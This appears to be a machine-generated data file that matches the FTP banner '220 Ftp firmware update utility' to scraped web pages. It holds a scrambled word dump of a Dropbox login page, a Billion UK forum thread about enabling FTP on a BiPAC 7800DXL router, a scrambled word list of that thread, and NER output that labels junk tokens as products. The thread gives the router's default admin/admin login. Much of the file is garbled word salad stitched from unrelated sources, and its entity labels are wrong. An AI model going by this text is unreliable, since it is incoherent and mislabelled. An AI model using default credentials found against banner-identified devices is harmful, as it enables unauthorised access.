+ tabletdropboxdesktop appmobile appsplanssecurityfeaturescompanyabout usjobspressinvestor relationsblogsupporthelp centercontact uscookiesprivacy dropbox try dropbox business dropbox sign insign computersend sms insteaduse mobile authenticator insteadsign termssitemapcommunitydevelopersreferralsforumconnecttwitterfacebookyoutubeproductsplusprofessionalbusinessenterprisethe dropbox website requires javascript enabledremember mesign incontinueor log dropbox account matching upkindle fireandroid 4 phone number ending google privacy policy currently onthis page 380united arab emirates dropbox dropbox digit codeentertrusted computers 507papua new guinea 1345central african republic 672northern mariana islands email passwordcaps lock 55british virgin islands single sign dropbox credentials authenticator app virgin islands retrytrusted computers 503equatorial guinea 357czech republic 1767dominican republic caicos islands 63pitcairn islands 599cayman islands 500faroe islands 386solomon islands 356marshall islands 251falkland islands 243cook islands never ask linksubmitting ... linkipadios 9 jan mayen gold disk email addressemail create one 971united kingdom 86christmas island 82south sudan 687new zealand 685san marino 683norfolk island 682costa rica 681western sahara 680palestinian territories 678vatican city 65sint maarten 599saint pierre 594french polynesia 590saint helena 508saint vincent 504hong kong 44united states 378são tomé 359burkina faso 351puerto rico 34sri lanka 33french guiana 31new caledonia 290saint kitts 27south korea 267bouvet island 263 text 252south africa 250saint barthélemy 248sierra leone 239saudi arabia 238caribbean netherlands 213american samoa 20el salvador 1cape verde 1869saint lucia 1758saint martin **. enter security code code generated ’ ivoire trust everyone security key computer insert islands email code ’ trust key computer uses use upwindowsphone tobago terms tap subject share service sent recaptcha príncipe protected nevis miquelon man leste kinshasa keeling inserting herzegovina grenadines googleoops futuna found find files click button burma brazzaville bissau barbuda anywhere anyone androidget android afghanistan 998vanuatu 996laos 995germany 994bahamas 993turks 992tanzania 98iraq 977netherlands 976montenegro 975bolivia 974réunion 973bangladesh 972italy 970panama 968pakistan 967zambia 966senegal 965kyrgyzstan 964ireland 962kazakhstan 961lesotho 960mali 95namibia 94suriname 93albania 92palau 92afghanistan 91indonesia 90turkmenistan 886tajikistan 880barbados 870poland 856latvia 855cameroon 853macedonia 852hungary 84wallis 81jersey 7rwanda 7kenya 692martinique 691moldova 690tonga 689gabon 688u 686kosovo 679finland 677somalia 676trinidad 675paraguay 674nepal 673bulgaria 672antigua 670togo 66timor 64nicaragua 62iran 61colombia 61cocos 61austria 60maldives 6 5999cyprus 598uzbekistan 597svalbard 596mauritania 595peru 593egypt 592haiti 591bosnia 590guam 58vietnam 57comoros 56china 55brazil 54armenia 52micronesia 51philippines 509honduras 506côte 505niger 502guinea 501benin 49ghana 48portugal 47swaziland 47oman 46switzerland 45djibouti 44jordan 44israel 43azerbaijan 423lithuania 421slovenia 420denmark 41taiwan 40russia 39venezuela 39jamaica 389madagascar 387botswana 385curaçao 383kuwait 382montserrat 381seychelles 377mongolia 376angola 375belgium 374aruba 373monaco 372ethiopia 371lebanon 370luxembourg 36iceland 358france 355algeria 354india 353isle 352macau 350greece 32belize 30greenland 299grenada 298fiji 297australia 291estonia 269congo 268sweden 266liberia 265malaysia 264nauru 263pakistan 262romania 262mexico 261malawi 260zimbabwe 258myanmar 257cambodia 256ukraine 255thailand 254kiribati 253dominica 245guyana 244anguilla 242congo 241gambia 240eritrea 237canada 236chad 235chile 234niue 233gibraltar 232singapore 231libya 230mayotte 229bermuda 228tokelau 227nigeria 226burundi 225croatia 224guinea 223malta 222mauritius 221serbia 220georgia 218liechtenstein 216turkey 212yemen 212mozambique 211spain 1uruguay 1qatar 1ecuador 1876japan 1868tunisia 1784samoa 1721slovakia 1684andorra 1671guatemala 1670norway 1664morocco 1649tuvalu 1473guadeloupe 1441bhutan 1340uganda 1284brunei 1268argentina 1264antarctica 1246belarus 1242bahrain 1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [],
+  "device_types": [
+    "button",
+    "lock"
+  ],
+  "products": []
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://forum.billion.uk.com/viewtopic.php?t=1487===============================
+
+ftp server - Billion UK Forum
+Billion UK Forum
+Anything About Billion For UK Users
+Skip to content
+Quick links
+FAQ
+Login
+Register
+Home
+Board index
+BiPAC 7800 series
+7800NXL/ DXL /DX / VDOX
+ftp server
+Post Reply
+Print view
+8 posts
+• Page 1 of 1
+mickey
+Posts: 3 Joined: Thu Aug 01, 2013 11:09 pm
+ftp server
+Quote
+Post
+by mickey » Fri Aug 02, 2013 2:21 pm
+I have a 7800DXL and the documentation says that the USB port allows the device to act as a ftp server.
+How do I set this up?
+Do I just connect a usb drive and change some settings - I have looked but can't see any that indicate that it can act as a ftp server - the only options I have under Configuration/USB are:
+Storage Device Info / User Accounts / Print Server & DLNA.
+The reason I ask is:
+I have a QNAP TS-110 NAS connected on my home network and am looking at backing up the data on it.
+One of the options I have is to set it to real-time remote replication to a ftp server, as I have a spare usb drive my thinking was I would connect this to the 7800DXL and back up to that using the ftp server functionality.
+Ps. Anyone who knows about QNAP, before you ask - yes I have tried connecting the usb drive to it and sync'ing directly but QNAP boxes have a habit of randomly disconnecting the usb drive and it's a right royal pain to get it connected & seen again!!
+Any help much appreciated.
+Mick.
+Top
+billion_fan
+Posts: 4672 Joined: Tue Jul 19, 2011 4:30 pm
+Re: ftp server
+Quote
+Post
+by billion_fan » Wed Aug 14, 2013 12:48 pm
+Just setup a username and password under 'User Accounts' or if you want to view files that already copied onto the device there is no need to setup a username and password.
+Once done, open your FTP client eg (Filezilla) and set it to 'Active' mode (passive mode will not work) once done FTP into 192.168.1.254 username 'admin' and password 'admin' or the username and password you setup. (port 21)
+Then you should be able to backup your stuff/access your HD.
+tested on firmware 2.32b
+Top
+stupot99
+Posts: 16 Joined: Tue Mar 05, 2013 12:53 pm
+Re: ftp server
+Quote
+Post
+by stupot99 » Mon Aug 19, 2013 4:01 pm
+Hi, My 7800DX arrived today, I'm not having much luck with FTP either, firmware is 2.32b.
+The USB stick is 8GB FAT32.
+It is identified and displayed in the "Configuration->System->USB->StorageDeviceInfo". It works fine as a DLNA server.
+I've tried connecting FTP with the admin account and a created user account, without success.
+I've tried connecting with FileZilla and FireFTP, both set to active mode.
+Here's the FileZilla log:
+Status:	Connecting to 192.168.1.254:21...
+Status:	Connection established, waiting for welcome message...
+Error:	Connection timed out
+Error:	Could not connect to server
+Status:	Waiting to retry...
+Any ideas?
+Top
+billion_fan
+Posts: 4672 Joined: Tue Jul 19, 2011 4:30 pm
+Re: ftp server
+Quote
+Post
+by billion_fan » Tue Aug 20, 2013 12:12 pm
+stupot99 wrote:Hi, My 7800DX arrived today, I'm not having much luck with FTP either, firmware is 2.32b.
+The USB stick is 8GB FAT32.
+It is identified and displayed in the "Configuration->System->USB->StorageDeviceInfo". It works fine as a DLNA server.
+I've tried connecting FTP with the admin account and a created user account, without success.
+I've tried connecting with FileZilla and FireFTP, both set to active mode.
+Here's the FileZilla log:
+Status:	Connecting to 192.168.1.254:21...
+Status:	Connection established, waiting for welcome message...
+Error:	Connection timed out
+Error:	Could not connect to server
+Status:	Waiting to retry...
+Any ideas?
+Running some more tests at the moment, stay tunned
+Top
+stupot99
+Posts: 16 Joined: Tue Mar 05, 2013 12:53 pm
+Re: ftp server
+Quote
+Post
+by stupot99 » Tue Aug 20, 2013 4:45 pm
+tuned...
+Top
+stupot99
+Posts: 16 Joined: Tue Mar 05, 2013 12:53 pm
+Re: ftp server
+Quote
+Post
+by stupot99 » Mon Aug 26, 2013 7:59 pm
+Just tried connecting from a Ubuntu terminal, it connects and displays "220 Ftp firmware update utility", then you enter the username+password and it does no more until the connection times out.
+Top
+billion_fan
+Posts: 4672 Joined: Tue Jul 19, 2011 4:30 pm
+Re: ftp server
+Quote
+Post
+by billion_fan » Tue Aug 27, 2013 10:34 am
+stupot99 wrote:Just tried connecting from a Ubuntu terminal, it connects and displays "220 Ftp firmware update utility", then you enter the username+password and it does no more until the connection times out.
+Just waiting for our engineers to respond regarding the FTP function, it seems to work with dos/command prompt (ftp 192.168.1.254 etc), but not with Filezilla, so I have reported this to our engineers.
+They are wokring on a FTP daemon modification and will update us in due course.
+Top
+stupot99
+Posts: 16 Joined: Tue Mar 05, 2013 12:53 pm
+Re: ftp server
+Quote
+Post
+by stupot99 » Tue Oct 22, 2013 7:56 pm
+FTP access on Firmware 2.32c is now working with common clients.
+Top
+Post Reply
+Print view
+Display: All posts1 day7 days2 weeks1 month3 months6 months1 year
+Sort by: AuthorPost timeSubject
+Direction: AscendingDescending
+8 posts
+• Page 1 of 1
+Return to “7800NXL/ DXL /DX / VDOX”
+Jump to
+General discussions
+BiPAC 7800 series
+↳   7800/7800N/7800GZ
+↳   7800NXL/ DXL /DX / VDOX
+BiPAC 8800 series
+BiPAC 8900 series
+BiPAC 7402 series
+BiPAC 7700 series
+BiPAC Homeplug series
+BiPAC 7300 series
+BiPAC 8200 series
+Not listed / Other models
+ISP relelated
+3G related
+Suggestions and Wishlist
+Test firmware Area
+Home Board index
+All times are UTC+01:00
+Delete cookies
+Powered by phpBB® Forum Software © phpBB Limited
+Privacy
+|
+Terms
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 Ftp firmware update utility
+Refined:  220 ftp firmware update utility
+
+============================https://forum.billion.uk.com/viewtopic.php?t=1487===============================
+
+ vdox bipac 8800 series bipac 8900 series bipac 7402 series bipac 7700 series bipac homeplug series bipac 7300 series bipac 8200 series content quick links faq login register home board index bipac 7800 series 7800nxl vdox ftp server post reply print view 8 posts • page 1 posts1 day7 days2 weeks1 month3 months6 months1 year sort general discussions bipac 7800 series ↳ 7800 phpbb ® forum software © phpbb limited privacy configuration -> system -> usb -> storagedeviceinfo ". wishlist test firmware area home board index ascendingdescending 8 posts • page 1 billion uk forum billion uk forum anything top post reply print view display models isp relelated 3g related suggestions 45 pm tuned ... top stupot99 posts 220 ftp firmware update utility ", 09 pm ftp server quote post stay tunned top stupot99 posts stupot99 » mon aug 26 billion_fan » wed aug 14 stupot99 » tue oct 22 mickey » fri aug 02 stupot99 » tue aug 20 billion_fan » tue aug 27 billion_fan » tue aug 20 stupot99 » mon aug 19 ftp server quote post vdox ” jump 32b top stupot99 posts 00 delete cookies powered top stupot99 posts top billion_fan posts welcome message ... error 1 mickey posts 7800gz ↳ 7800nxl 12 pm stupot99 wrote 56 pm ftp access uk users skip tue jul 19 ftp server functionality print server tue mar 05 thu aug 01 ftp daemon modification ftp client eg home network time remote replication right royal pain authorpost timesubject direction already copied onto 7800dx arrived today view files usb port allows spare usb drive help much appreciated tried connecting ftp “ 7800nxl storage device info created user account 254 etc ), 110 nas connected ftp server 01 pm hi stupot99 wrote 1 return update us ftp function ftp either retry ... 21 ... firmware 2 usb drive server status dlna server 59 pm 53 pm 48 pm 30 pm 21 pm ftp 192 done ftp usb stick billion 2013 12 1 user accounts tried connecting port 21 much luck configuration works fine without success ubuntu terminal respond regarding randomly disconnecting ing directly firmware due course documentation says connection timed connection established common clients command prompt admin account 8gb fat32 4672 joined 3 joined 2013 7 2013 4 2013 11 2013 10 2011 4 16 joined qnap ts qnap boxes passive mode 2013 2 would connect filezilla log connection times 254 username active mode usb error access 32b 01 hi device connecting connected 254 qnap mode 2 username times status filezilla done dlna connect admin active 192 yes working work wokring want waiting utc using thinking tests tested terms sync stuff setup settings set seen seems see running reported reason real ps password options open one need moment mick looking looked listed knows indicate identified ideas hd habit get fireftp enter engineers dxl dx dos displays displayed data could connects change backup backing back ask anyone act able 7800n 7800dxl 34 32c 168 !!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [],
+  "device_types": [],
+  "products": [
+    "posts1",
+    "day7",
+    "days2",
+    "weeks1",
+    "month3",
+    "months6",
+    "months1",
+    "stupot99",
+    "fat32"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
